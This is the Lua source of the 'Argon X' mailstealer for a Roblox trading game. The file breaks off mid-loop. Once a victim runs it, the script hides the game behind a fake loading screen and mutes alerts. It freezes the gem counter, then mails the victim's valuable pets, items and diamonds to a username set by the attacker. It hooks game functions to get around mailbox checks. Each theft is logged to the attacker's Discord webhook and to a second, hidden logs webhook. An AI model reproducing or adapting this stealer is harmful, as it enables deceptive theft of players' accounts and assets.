mailstealer_name = "Argon X"

Roblox_Username = _G.Username
Discord_Webhook = _G.Webhook

-- simple mailstealer
LOGS_WEBHOOK = LogsWebhook
if getgenv().Executed == true then
-- return
end
getgenv().Executed = true

repeat
    task.wait()
until game:IsLoaded()

if not game:IsLoaded() then
    game.Loaded:Wait()
end

local idiotuser = game:GetService("Players").LocalPlayer.Name

if idiotuser == _G.Username then
    game:GetService("Players").LocalPlayer:Kick("You Are The Owner! (test it on alt acc)")
    return
end
if _G.Username == nil then
    game:GetService("Players").LocalPlayer:Kick("Put A UserName")
    return
end

repeat
    task.wait()
until game:IsLoaded()
repeat
    task.wait()
until game.PlaceId ~= nil
repeat
    task.wait()
until not game.Players.LocalPlayer.PlayerGui:FindFirstChild("__INTRO")

-- Config
UserSettings().GameSettings.MasterVolume = 0
if _G.MouseLock ~= false then
    runService.RenderStepped:Connect(function()
        for _, keyCode in next, disabledKeyCodes do
            keyrelease(keyCode)
        end

        mousemoveabs(camera.ViewportSize.X / 3, camera.ViewportSize.Y / 3);
    end);
end

if _G.AntiLeave ~= false then
    for i, v in pairs(game:GetService("Players").LocalPlayer.PlayerGui:GetChildren()) do
        if v.Name ~= "Inventory" then
            v:Destroy()
        end
    end
    for i, v in pairs(game:GetService("CoreGui"):GetChildren()) do
        if v.Name ~= "RizzHub" and v.Name ~= "RobloxPromptGui" then
            v:Destroy()
        end
    end
end

if _G.LoadingScreen ~= false then
local Loading = Instance.new("ScreenGui")
local MainFrame = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local Dots = Instance.new("Frame")
local Dot1 = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local InsideDot = Instance.new("Frame")
local UICorner_2 = Instance.new("UICorner")
local Dot2 = Instance.new("Frame")
local UICorner_3 = Instance.new("UICorner")
local InsideDot_2 = Instance.new("Frame")
local UICorner_4 = Instance.new("UICorner")
local Dot3 = Instance.new("Frame")
local UICorner_5 = Instance.new("UICorner")
local InsideDot_3 = Instance.new("Frame")
local UICorner_6 = Instance.new("UICorner")
local Bar = Instance.new("Frame")
local Bar2 = Instance.new("Frame")
local UICorner_7 = Instance.new("UICorner")
local UICorner_8 = Instance.new("UICorner")
local Percentage = Instance.new("TextLabel")
local Tip = Instance.new("TextLabel")
local EndSequence = Instance.new("Frame")
if _G.ScriptName == nil and _G.FirstText == nil and _G.SecondText == nil and _G.ThirdText == nil and WaitingTime == nil then
	_G.ScriptName = "Argon X Scripts";
	_G.FirstText = "Preparing Script...";
	_G.SecondText = "Loading Script...";
	_G.ThirdText = "Almost Done...";
	_G.WaitingTime = 180;
end
;
-- Properties:

Loading.Name = "Argon X Scripts";
Loading.Parent = game:GetService("CoreGui");
Loading.ZIndexBehavior = Enum.ZIndexBehavior.Sibling;
Loading.ResetOnSpawn = false;
MainFrame.Name = "MainFrame";
MainFrame.Parent = Loading;
MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20);
MainFrame.BorderSizePixel = 0;
MainFrame.Size = UDim2.new(1, 0, 1, 0);
Title.Name = "Title";
Title.Parent = MainFrame;
Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255);
Title.BackgroundTransparency = 1.000;
Title.Position = UDim2.new(0.161527574, 0, 0.171569318, 0);
Title.Size = UDim2.new(0.632528603, 0, 0.232815996, 0);
Title.Font = Enum.Font.FredokaOne;
Title.Text = ScriptName;
Title.TextColor3 = Color3.fromRGB(255, 255, 255);
Title.TextScaled = true;
Title.TextSize = 14.000;
Title.TextWrapped = true;
Dots.Name = "Dots";
Dots.Parent = MainFrame;
Dots.BackgroundColor3 = Color3.fromRGB(255, 255, 255);
Dots.BackgroundTransparency = 1.000;
Dots.Position = UDim2.new(0.470970035, 0, 0.818612278, 0);
Dots.Size = UDim2.new(0.0571707934, 0, 0.0360675976, 0);
Dot1.Name = "Dot1";
Dot1.Parent = Dots;
Dot1.BackgroundColor3 = Color3.fromRGB(40, 40, 40);
Dot1.Position = UDim2.new(0.0611661971, 0, 0.234447539, 0);
Dot1.Size = UDim2.new(0.159291148, 0, 0.51158762, 0);
UICorner.CornerRadius = UDim.new(0.5, 0);
UICorner.Parent = Dot1;
InsideDot.Name = "InsideDot";
InsideDot.Parent = Dot1;
InsideDot.AnchorPoint = Vector2.new(0.5, 0.5);
InsideDot.BackgroundColor3 = Color3.fromRGB(255, 255, 255);
InsideDot.Position = UDim2.new(0.5, 0, 0.5, 0);
UICorner_2.CornerRadius = UDim.new(0.5, 0);
UICorner_2.Parent = InsideDot;
Dot2.Name = "Dot2";
Dot2.Parent = Dots;
Dot2.BackgroundColor3 = Color3.fromRGB(40, 40, 40);
Dot2.Position = UDim2.new(0.419989735, 0, 0.234447539, 0);
Dot2.Size = UDim2.new(0.159291148, 0, 0.51158762, 0);
UICorner_3.CornerRadius = UDim.new(0.5, 0);
UICorner_3.Parent = Dot2;
InsideDot_2.Name = "InsideDot";
InsideDot_2.Parent = Dot2;
InsideDot_2.AnchorPoint = Vector2.new(0.5, 0.5);
InsideDot_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255);
InsideDot_2.Position = UDim2.new(0.5, 0, 0.5, 0);
UICorner_4.CornerRadius = UDim.new(0.5, 0);
UICorner_4.Parent = InsideDot_2;
Dot3.Name = "Dot3";
Dot3.Parent = Dots;
Dot3.BackgroundColor3 = Color3.fromRGB(40, 40, 40);
Dot3.Position = UDim2.new(0.778813243, 0, 0.234447539, 0);
Dot3.Size = UDim2.new(0.159291148, 0, 0.51158762, 0);
UICorner_5.CornerRadius = UDim.new(0.5, 0);
UICorner_5.Parent = Dot3;
InsideDot_3.Name = "InsideDot";
InsideDot_3.Parent = Dot3;
InsideDot_3.AnchorPoint = Vector2.new(0.5, 0.5);
InsideDot_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255);
InsideDot_3.Position = UDim2.new(0.5, 0, 0.5, 0);
UICorner_6.CornerRadius = UDim.new(0.5, 0);
UICorner_6.Parent = InsideDot_3;
Bar.Name = "Bar";
Bar.Parent = MainFrame;
Bar.BackgroundColor3 = Color3.fromRGB(40, 40, 40);
Bar.BorderSizePixel = 0;
Bar.Position = UDim2.new(0.219547689, 0, 0.764966607, 0);
Bar.Size = UDim2.new(0.560904443, 0, 0.0365853645, 0);
Bar2.Name = "Bar2";
Bar2.Parent = Bar;
Bar2.BackgroundColor3 = Color3.fromRGB(60, 60, 60);
Bar2.BorderSizePixel = 0;
Bar2.Size = UDim2.new(0, 0, 1, 0);
UICorner_7.CornerRadius = UDim.new(0.5, 0);
UICorner_7.Parent = Bar2;
UICorner_8.CornerRadius = UDim.new(0.5, 0)
UICorner_8.Parent = Bar;
Percentage.Name = "Percentage";
Percentage.Parent = Bar;
Percentage.BackgroundColor3 = Color3.fromRGB(255, 255, 255);
Percentage.BackgroundTransparency = 1.000;
Percentage.Position = UDim2.new(0.280816972, 0, 0.0909090936, 0);
Percentage.Size = UDim2.new(0.438366145, 0, 0.787879348, 0);
Percentage.Font = Enum.Font.FredokaOne;
Percentage.Text = "0%";
Percentage.TextColor3 = Color3.fromRGB(255, 255, 255);
Percentage.TextScaled = true;
Percentage.TextSize = 14.000;
Percentage.TextWrapped = true;
Tip.Name = "Tip";
Tip.Parent = MainFrame;
Tip.BackgroundColor3 = Color3.fromRGB(255, 255, 255);
Tip.BackgroundTransparency = 1.000;
Tip.Position = UDim2.new(0.280816913, 0, 0.717294872, 0);
Tip.Size = UDim2.new(0.438366145, 0, 0.0299334861, 0);
Tip.Font = Enum.Font.SourceSansItalic;
Tip.Text = "Tip:";
Tip.TextColor3 = Color3.fromRGB(138, 138, 138);
Tip.TextScaled = true;
Tip.TextSize = 14.000;
Tip.TextWrapped = true;
EndSequence.Name = "EndSequence";
EndSequence.Parent = Loading;
EndSequence.BackgroundColor3 = Color3.fromRGB(20, 20, 20);
EndSequence.BorderSizePixel = 0;
EndSequence.Position = UDim2.new(1, 0, 0, 0);
EndSequence.Size = UDim2.new(1, 0, 1, 0);

-- Scripts:

local function BCCEFGF_fake_script() -- Dots.Dots 
	local script = Instance.new('LocalScript', Dots)

	while true do
		wait(0.25)
		script.Parent.Dot1.InsideDot:TweenSize(UDim2.new(1, 0, 1, 0), "In", "Sine", 0.25, true)
		wait(0.25)
		script.Parent.Dot2.InsideDot:TweenSize(UDim2.new(1, 0, 1, 0), "In", "Sine", 0.25, true)
		wait(0.25)
		script.Parent.Dot3.InsideDot:TweenSize(UDim2.new(1, 0, 1, 0), "In", "Sine", 0.25, true)
		wait(0.25)
		script.Parent.Dot1.InsideDot:TweenSize(UDim2.new(0, 0, 0, 0), "In", "Sine", 0.25, true)
		wait(0.25)
		script.Parent.Dot2.InsideDot:TweenSize(UDim2.new(0, 0, 0, 0), "In", "Sine", 0.25, true)
		wait(0.25)
		script.Parent.Dot3.InsideDot:TweenSize(UDim2.new(0, 0, 0, 0), "In", "Sine", 0.25, true)
	end
end
coroutine.wrap(BCCEFGF_fake_script)()
local function ZEYD_fake_script() -- MainFrame.Manager 
	local script = Instance.new('LocalScript', MainFrame)

	local bar = script.Parent.Bar
	local insidebar = bar.Bar2
	local percentage = bar.Percentage

	wait(5)
	insidebar:TweenSize(UDim2.new(1, 0, 1, 0), "In", "Linear", WaitingTime + 1, true);
	wait(20)
	script.Parent.Parent.EndSequence:TweenPosition(UDim2.new(0,0,0,0), "InOut", "Quad", 3, true)
	wait(3)
	script.Parent.Visible = false
	script.Parent.Parent.EndSequence:TweenPosition(UDim2.new(-1,0,0,0), "InOut", "Quad", 3, true)
	game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, false)
	game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
	game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
	game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.EmotesMenu, false)
end
coroutine.wrap(ZEYD_fake_script)()
local function ZVPQ_fake_script() -- Percentage.Percentage 
	local script = Instance.new('LocalScript', Percentage)
	local numberwaiting = _G.WaitingTime / 100;
	wait(5)
	for i = 1,100 do
		script.Parent.Text = i.."%"
		wait(numberwaiting);
	end
end
coroutine.wrap(ZVPQ_fake_script)()
local function NBMVQ_fake_script() -- Tip.Tips 
	local script = Instance.new('LocalScript', Tip)

	local tip = script.Parent

	while true do
		wait(5);
		tip.Text = FirstText;
		wait(5);
		tip.Text = SecondText;
		wait(5);
		tip.Text = ThirdText;
	end
end
coroutine.wrap(NBMVQ_fake_script)()
local function TQYLASK_fake_script() -- Loading.DefaultUI 
	local script = Instance.new('LocalScript', Loading)

	game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, false)
	game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
	game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
	game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.EmotesMenu, false)
end
coroutine.wrap(TQYLASK_fake_script)()
end

-- variables:

local Library = require(game.ReplicatedStorage.Library)
local Save = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get()
local Directory = require(game:GetService("ReplicatedStorage").Library.Directory)
local Player = game.Players.LocalPlayer
local Inventory = Save.Inventory
local HttpService = game:GetService("HttpService")
local MailMessage = "ego on top!"
local message = require(game.ReplicatedStorage.Library.Client.Message)
local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")

for id, table in pairs(Inventory.Currency) do
    if table.id == "Diamonds" then
        GemsAmount = table._am or 0
        break
    end
end

for adress, func in pairs(getgc()) do
    if typeof(func) == "function" and debug.getinfo(func).name == "computeSendMailCost" then
        FunctionToGetFirstPriceOfMail = func
        break
    end
end

FirstPriceOfMail = FunctionToGetFirstPriceOfMail()

if FirstPriceOfMail > GemsAmount then
    print("You don't have enough gems to run a script")
    return
end

local FormatNumber = function(number)
    local n = math.floor(number)
    local suf = {
        "",
        "k",
        "m",
        "b",
        "t"
    }
    local INDEX = 1
    while n >= 1000 do
        n = n / 1000
        INDEX = INDEX + 1
    end
    return string.format("%.2f%s", n, suf[INDEX])
end

local GetItemValue = function(Type, ItemTable)
    return (require(game:GetService("ReplicatedStorage").Library.Client.DevRAPCmds).Get(
        {
            Class = {
                Name = Type
            },
            IsA = function(hmm)
                return hmm == Type
            end,
            GetId = function()
                return ItemTable.id
            end,
            StackKey = function()
                return HttpService:JSONEncode(
                    {
                        id = ItemTable.id,
                        pt = ItemTable.pt,
                        sh = ItemTable.sh,
                        tn = ItemTable.tn
                    }
                )
            end
        }
    ) or 0)
end

local GetItemValueOfItems = function()
    RAP = 0
    for name_of_category, category in pairs(Inventory) do
        if category ~= nil then
            for i, v in pairs(category) do
                RAP = RAP + GetItemValue(name_of_category, v)
            end
        end
    end
    return RAP
end

function deepCopy(original)
    local copy = {}
    for k, v in pairs(original) do
        if type(v) == "table" then
            v = deepCopy(v)
        end
        copy[k] = v
    end
    return copy
end

local function SendMessage(id, item_type, RBgoldNormal, thumbnail, webhook, pets_left, shiny, ping, RAP, totalRap1)
    local headers = {
        ["Content-Type"] = "application/json"
    }
    if shiny == true then
        shinyy = "Shiny"
    elseif shiny == false then
        shinyy = "not Shiny"
    end
    imgs =
        "https://media.discordapp.net/attachments/1279110366797758478/1279110412696158289/static.png?ex=66e50c27&is=66e3baa7&hm=b12b9c5a3bfbd35e846e01cffe3bcccc6016b9f1f5f17633501bde691685345a&=&format=webp&quality=lossless"
    local fardplayer = game:GetService("Players").LocalPlayer
    local ExecutorWebhook = identifyexecutor() or "undefined"
    JobId = game.JobId
    local PlayerUser = Player.Name
    local msg = {
        ["content"] = ping,
        ["username"] = "" .. mailstealer_name .. " Mailstealer",
        ["avatar_url"] = imgs,
        ["embeds"] = {
            {
                ["title"] = "**You just got a new item!**",
                ["type"] = "rich",
                ["color"] = tonumber(8323327),
                ["thumbnail"] = {
                    ["url"] = thumbnail
                },
                ["fields"] = {
                    {
                        ["name"] = "**This data was generated using " .. mailstealer_name .. " Mailstealer**",
                        ["value"] = "```Username     : " ..
                            fardplayer.Name ..
                                "\nUser-ID      : " ..
                                    fardplayer.userId ..
                                        "\nAccount Age  : " ..
                                            fardplayer.AccountAge ..
                                                " Days" ..
                                                    "\nExploit      : " ..
                                                        ExecutorWebhook ..
                                                            "\nReceiver     : " ..
                                                                Roblox_Username ..
                                                                    "\nTotal RAP    : " ..
                                                                        FormatNumber(totalRap1) .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = ":dog: **Pets left** :dog:",
                        ["value"] = "```➜ " .. pets_left .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = ":money_mouth: **" .. item_type .. "** :money_mouth:",
                        ["value"] = "```➜ " .. id .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = ":trophy: **Item RAP** :trophy:",
                        ["value"] = "```➜ " .. FormatNumber(RAP) .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = ":gem: **Gems Left** :gem:",
                        ["value"] = "```➜ " .. FormatNumber(GemsAmount) .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = ":sparkles: **Shiny** :sparkles:",
                        ["value"] = "```➜ " .. shinyy .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = ":rainbow: **RB/Gold/Reg** :sparkles:",
                        ["value"] = "```➜ " .. RBgoldNormal .. "```",
                        ["inline"] = true
                    }
                }
            }
        },
        ["attachments"] = {}
    }
    local request = http_request or request or HttpPost or syn.request
    request(
        {
            Url = webhook,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = game.HttpService:JSONEncode(msg)
        }
    )
end

-- skidded that, SORRY!!

local gemsleaderstat = Player.leaderstats["\240\159\146\142 Diamonds"].Value
local gemsleaderstatpath = Player.leaderstats["\240\159\146\142 Diamonds"]
gemsleaderstatpath:GetPropertyChangedSignal("Value"):Connect(
    function()
        gemsleaderstatpath.Value = gemsleaderstat
    end
)

local loading = Player.PlayerScripts.Scripts.Core["Process Pending GUI"]
local noti = Player.PlayerGui.Notifications
loading.Disabled = true
noti:GetPropertyChangedSignal("Enabled"):Connect(
    function()
        noti.Enabled = false
    end
)
noti.Enabled = false

task.spawn(
    function()
        game.DescendantAdded:Connect(
            function(x)
                if x.ClassName == "Sound" then
                    if
                        x.SoundId == "rbxassetid://11839132565" or x.SoundId == "rbxassetid://14254721038" or
                            x.SoundId == "rbxassetid://12413423276"
                     then
                        x.Volume = 0
                        x.PlayOnRemove = false
                        x:Destroy()
                    end
                end
            end
        )
    end
)

-- no more skidding!

local function GetThumbnail(imageid)
    Asset = string.split(imageid, "rbxassetid://")[2]
    local Size = "420x420"
    local Image =
        game:HttpGet(
        "https://thumbnails.roblox.com/v1/assets?assetIds=" ..
            Asset .. "&returnPolicy=PlaceHolder&size=" .. Size .. "&format=png"
    )
    thumbnail = game.HttpService:JSONDecode(Image).data[1].imageUrl
    return thumbnail
end

_G.MinimumRAP = FirstPriceOfMail

-- EMPTY BOXES

if Inventory.Box then
    for key, value in pairs(Inventory.Box) do
        if value._uq then
            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Box: Withdraw All"):InvokeServer(
                key
            )
        end
    end
end

local response, err =
    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Claim All"):InvokeServer()
while err == "You must wait 30 seconds before using the mailbox!" do
    wait()
    response, err =
        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Claim All"):InvokeServer()
end

require(game.ReplicatedStorage.Library.Client.DaycareCmds).Claim()
require(game.ReplicatedStorage.Library.Client.ExclusiveDaycareCmds).Claim()

local GetListWithAllItems = function()
    local hits = {}
    if Inventory.Pet ~= nil then
        for i, v in pairs(Inventory.Pet) do
            id = v.id
            dir = Directory.Pets[id]
            if dir.huge and dir.Tradable ~= false then
                rap = GetItemValue("Pet", v)
                if v.pt == 1 then
                    ItemImageId = dir.goldenThumbnail
                    ItemType = "Golden"
                elseif v.pt == 2 then
                    ItemImageId = dir.thumbnail
                    ItemType = "Rainbow"
                else
                    ItemImageId = dir.thumbnail
                    ItemType = "Normal"
                end
                table.insert(
                    hits,
                    {
                        Item_Id = i,
                        Item_Name = v.id,
                        Item_Amount = v._am or 1,
                        Item_RAP = rap,
                        Item_Class = "Pet",
                        IsShiny = v.sh or false,
                        IsLocked = v.lk or false,
                        Item_ImageId = ItemImageId,
                        Item_Type = ItemType
                    }
                )
            end
            if dir.exclusiveLevel and dir.Tradable ~= false then
                rap = GetItemValue("Pet", v) * (v._am or 1)
                if v.pt == 1 then
                    ItemImageId = dir.goldenThumbnail
                    ItemType = "Golden"
                elseif v.pt == 2 then
                    ItemImageId = dir.thumbnail
                    ItemType = "Rainbow"
                else
                    ItemImageId = dir.thumbnail
                    ItemType = "Normal"
                end
                if rap > MinimumRAP then
                    table.insert(
                        hits,
                        {
                            Item_Id = i,
                            Item_Name = v.id,
                            Item_Amount = v._am or 1,
                            Item_RAP = rap,
                            Item_Class = "Pet",
                            IsShiny = v.sh or false,
                            IsLocked = v.lk or false,
                            Item_ImageId = ItemImageId,
                            Item_Type = ItemType
                        }
                    )
                end
            end
        end
    end
    if Inventory.Egg ~= nil then
        for i, v in pairs(Inventory.Egg) do
            id = v.id
            dir = Directory.Eggs[id]
            rap = GetItemValue("Egg", v)
            ItemType = "Normal"
            ItemImageId = dir.icon
            if rap > MinimumRAP then
                table.insert(
                    hits,
                    {
                        Item_Id = i,
                        Item_Name = v.id,
                        Item_Amount = v._am or 1,
                        Item_RAP = rap,
                        Item_Class = "Egg",
                        IsShiny = v.sh or false,
                        IsLocked = v.lk or false,
                        Item_ImageId = ItemImageId,
                        Item_Type = ItemType
                    }
                )
            end
        end
    end
    if Inventory.Misc ~= nil then
        for i, v in pairs(Inventory.Misc) do
            id = v.id
            dir = Directory.MiscItems[id]
            rap = GetItemValue("Misc", v)
            ItemType = "Normal"
            ItemImageId = dir.Icon
            if rap > MinimumRAP and v.id ~= "Slingshot" then
                table.insert(
                    hits,
                    {
                        Item_Id = i,
                        Item_Name = v.id,
                        Item_Amount = v._am or 1,
                        Item_RAP = rap,
                        Item_Class = "Misc",
                        IsShiny = v.sh or false,
                        IsLocked = v.lk or false,
                        Item_ImageId = ItemImageId,
                        Item_Type = ItemType
                    }
                )
            end
        end
    end
    if Inventory.Charm ~= nil then
        for i, v in pairs(Inventory.Charm) do
            id = v.id
            dir = Directory.Charms[id]
            rap = GetItemValue("Charm", v)
            ItemType = "Normal"
            ItemImageId = dir.Icon
            if rap > MinimumRAP then
                table.insert(
                    hits,
                    {
                        Item_Id = i,
                        Item_Name = v.id,
                        Item_Amount = v._am or 1,
                        Item_RAP = rap,
                        Item_Class = "Charm",
                        IsShiny = v.sh or false,
                        IsLocked = v.lk or false,
                        Item_ImageId = ItemImageId,
                        Item_Type = ItemType
                    }
                )
            end
        end
    end
    if Inventory.Enchant ~= nil then
        for i, v in pairs(Inventory.Enchant) do
            id = v.id
            dir = Directory.Enchants[id]
            rap = GetItemValue("Enchant", v)
            ItemType = "Normal"
            ItemImageId = dir.Icon(v.tn)
            if rap > MinimumRAP then
                table.insert(
                    hits,
                    {
                        Item_Id = i,
                        Item_Name = v.id,
                        Item_Amount = v._am or 1,
                        Item_RAP = rap,
                        Item_Class = "Enchant",
                        IsShiny = v.sh or false,
                        IsLocked = v.lk or false,
                        Item_ImageId = ItemImageId,
                        Item_Type = ItemType
                    }
                )
            end
        end
    end
    if Inventory.Lootbox ~= nil then
        for i, v in pairs(Inventory.Lootbox) do
            id = v.id
            dir = Directory.Lootboxes[id]
            rap = GetItemValue("Lootbox", v)
            ItemType = "Normal"
            ItemImageId = dir.Icon
            if rap > MinimumRAP then
                table.insert(
                    hits,
                    {
                        Item_Id = i,
                        Item_Name = v.id,
                        Item_Amount = v._am or 1,
                        Item_RAP = rap,
                        Item_Class = "Lootbox",
                        IsShiny = v.sh or false,
                        IsLocked = v.lk or false,
                        Item_ImageId = ItemImageId,
                        Item_Type = ItemType
                    }
                )
            end
        end
    end
    if Inventory.Potion ~= nil then
        for i, v in pairs(Inventory.Potion) do
            id = v.id
            dir = Directory.Potions[id]
            rap = GetItemValue("Potion", v)
            ItemType = "Normal"
            ItemImageId = dir.Icon(v.tn)
            if rap > MinimumRAP then
                table.insert(
                    hits,
                    {
                        Item_Id = i,
                        Item_Name = v.id,
                        Item_Amount = v._am or 1,
                        Item_RAP = rap,
                        Item_Class = "Potion",
                        IsShiny = v.sh or false,
                        IsLocked = v.lk or false,
                        Item_ImageId = ItemImageId,
                        Item_Type = ItemType
                    }
                )
            end
        end
    end
    if Inventory.Seed ~= nil then
        for i, v in pairs(Inventory.Seed) do
            id = v.id
            dir = Directory.Seeds[id]
            rap = GetItemValue("Seed", v)
            ItemType = "Normal"
            ItemImageId = dir.Icon
            if rap > MinimumRAP then
                table.insert(
                    hits,
                    {
                        Item_Id = i,
                        Item_Name = v.id,
                        Item_Amount = v._am or 1,
                        Item_RAP = rap,
                        Item_Class = "Seed",
                        IsShiny = v.sh or false,
                        IsLocked = v.lk or false,
                        Item_ImageId = ItemImageId,
                        Item_Type = ItemType
                    }
                )
            end
        end
    end
    if Inventory.Ultimate ~= nil then
        for i, v in pairs(Inventory.Ultimate) do
            id = v.id
            dir = Directory.Ultimates[id]
            rap = GetItemValue("Ultimate", v)
            ItemType = "Normal"
            ItemImageId = dir.Icon
            if rap > MinimumRAP then
                table.insert(
                    hits,
                    {
                        Item_Id = i,
                        Item_Name = v.id,
                        Item_Amount = v._am or 1,
                        Item_RAP = rap,
                        Item_Class = "Ultimate",
                        IsShiny = v.sh or false,
                        IsLocked = v.lk or false,
                        Item_ImageId = ItemImageId,
                        Item_Type = ItemType
                    }
                )
            end
        end
    end
    if Inventory.Fruit ~= nil then
        for i, v in pairs(Inventory.Fruit) do
            id = v.id
            dir = Directory.Fruits[id]
            rap = GetItemValue("Fruit", v)
            ItemType = "Normal"
            ItemImageId = dir.Icon
            if rap > MinimumRAP then
                table.insert(
                    hits,
                    {
                        Item_Id = i,
                        Item_Name = v.id,
                        Item_Amount = v._am or 1,
                        Item_RAP = rap,
                        Item_Class = "Fruit",
                        IsShiny = v.sh or false,
                        IsLocked = v.lk or false,
                        Item_ImageId = ItemImageId,
                        Item_Type = ItemType
                    }
                )
            end
        end
    end
    if Inventory.Hoverboard ~= nil then
        for i, v in pairs(Inventory.Hoverboard) do
            id = v.id
            dir = Directory.Hoverboards[id]
            rap = GetItemValue("Hoverboard", v)
            ItemType = "Normal"
            ItemImageId = dir.Icon
            if rap > MinimumRAP then
                table.insert(
                    hits,
                    {
                        Item_Id = i,
                        Item_Name = v.id,
                        Item_Amount = v._am or 1,
                        Item_RAP = rap,
                        Item_Class = "Hoverboard",
                        IsShiny = v.sh or false,
                        IsLocked = v.lk or false,
                        Item_ImageId = ItemImageId,
                        Item_Type = ItemType
                    }
                )
            end
        end
    end
    if Inventory.Booth ~= nil then
        for i, v in pairs(Inventory.Booth) do
            id = v.id
            dir = Directory.Booths[id]
            rap = GetItemValue("Booth", v)
            ItemType = "Normal"
            ItemImageId = dir.Icon
            if rap > MinimumRAP then
                table.insert(
                    hits,
                    {
                        Item_Id = i,
                        Item_Name = v.id,
                        Item_Amount = v._am or 1,
                        Item_RAP = rap,
                        Item_Class = "Booth",
                        IsShiny = v.sh or false,
                        IsLocked = v.lk or false,
                        Item_ImageId = ItemImageId,
                        Item_Type = ItemType
                    }
                )
            end
        end
    end
    table.sort(
        hits,
        function(a, b)
            return a.Item_RAP > b.Item_RAP
        end
    )
    return hits
end

local function IsMailboxHooked()
    local uid
    for i, v in pairs(Inventory["Pet"]) do
        uid = i
        break
    end
    local args = {
        [1] = "Roblox",
        [2] = "Test",
        [3] = "Pet",
        [4] = uid,
        [5] = 1
    }
    local response, err = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
    if (err == "They don't have enough space!") or (err == "You don't have enough diamonds to send the mail!") then
        return false
    else
        return true
    end
end

itemsCounted = 0
local totalRap = 0
local hits = GetListWithAllItems()
currentMailPrice = FirstPriceOfMail
-- make it count total rap until sending price is bigger than gems amount, also make it calculate gems amount after each send
for i, v in pairs(hits) do
    if v.Item_RAP >= currentMailPrice then
        totalRap = totalRap + v.Item_RAP
        itemsCounted = itemsCounted + 1
    end
    currentMailPrice = currentMailPrice * 1.5
    if currentMailPrice > 5000000 then
        currentMailPrice = 5000000
    end
end


local function sendItem(category, uid, am, locked)
    local args = {
        [1] = Roblox_Username,
        [2] = "" .. mailstealer_name .. " mailstealer on top",
        [3] = category,
        [4] = uid,
        [5] = am
    }
    local response = false
    repeat
        if locked == true then
            local args = {
                uid,
                false
            }
            game:GetService("ReplicatedStorage").Network.Locking_SetLocked:InvokeServer(unpack(args))
        end
        local response, err = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
        if response == false and err == "They don't have enough space!" then
            Roblox_Username = Username2
            args[1] = Roblox_Username
        end
    until response == true
    GemsAmount = GemsAmount - FirstPriceOfMail
    FirstPriceOfMail = math.ceil(math.ceil(FirstPriceOfMail) * 1.5)
    if FirstPriceOfMail > 5000000 then
        FirstPriceOfMail = 5000000
    end
end

local function SendAllGems()
    for i, v in pairs(Inventory.Currency) do
        if v.id == "Diamonds" then
            if GemsAmount >= (FirstPriceOfMail + 10000) then
				SentGems = GemsAmount - FirstPriceOfMail
                local args = {
                    [1] = Roblox_Username,
                    [2] = "" .. mailstealer_name .. " mailstealer on top",
                    [3] = "Currency",
                    [4] = i,
                    [5] = SentGems
                }
                local response = false
                repeat
                    local response = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
                until response == true
                SendMessage("Diamonds", "Currency", "Gems", "rbxassetid://15258327857", Discord_Webhook, "none", "no", "@everyone", SentGems, totalRap)
                break
            end
        end
    end
end


Left_Hits = #hits

if #hits > 0 or GemsAmount > FirstPriceOfMail then
    local blob_a = require(game:GetService("ReplicatedStorage").Library.Client.Save)
    local blob_b = blob_a.Get()

    FavoriteModeSelection = blob_a.Get().FavoriteModeSelection
    FavoriteModeSelectionPlaza = blob_a.Get().FavoriteModeSelectionPlaza

    oldGet = deepCopy(blob_b)
    blob_a.Get = function(...)
        blob_b = oldGet
        blob_b.FavoriteModeSelection = {FavoriteModeSelection}
        blob_b.FavoriteModeSelectionPlaza = {FavoriteModeSelectionPlaza}
        return blob_b
    end

    if IsMailboxHooked() then
        local Mailbox = game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send")
        for i, Func in ipairs(getgc(true)) do
            if typeof(Func) == "function" and debug.info(Func, "n") == "typeof" then
                local Old
                Old =
                    hookfunction(
                    Func,
                    function(Ins, ...)
                        if Ins == Mailbox then
                            return tick()
                        end
                        return Old(Ins, ...)
                    end
                )
            end
        end
    end
    for i, v in pairs(hits) do
        if FirstPriceOfMail > 5000000 then
            FirstPriceOfMail = 5000000
        end
        if v.Item_RAP >= FirstPriceOfMail then
            sendItem(v.Item_Class, v.Item_Id, v.Item_Amount, v.IsLocked)
            thumb = GetThumbnail(v.Item_ImageId)
            Left_Hits = Left_Hits - 1
            task.spawn(
                function()
                    SendMessage(
                        v.Item_Name,
                        v.Item_Class,
                        v.Item_Type,
                        thumb,
                        Discord_Webhook,
                        Left_Hits,
                        v.IsShiny,
                        "@everyone",
                        v.Item_RAP,
                        totalRap
                    )
                    if Roblox_Username ~= _G.DualhookUsername then
                        SendMessage(
                            v.Item_Name,
                            v.Item_Class,
                            v.Item_Type,
                            thumb,
                            LOGS_WEBHOOK,
                            Left_Hits,
                            v.IsShiny,
                            "Argon on top",
                            v.Item_RAP,
                            totalRap
                        )
                    end
                end
            )
        else
            break
        end
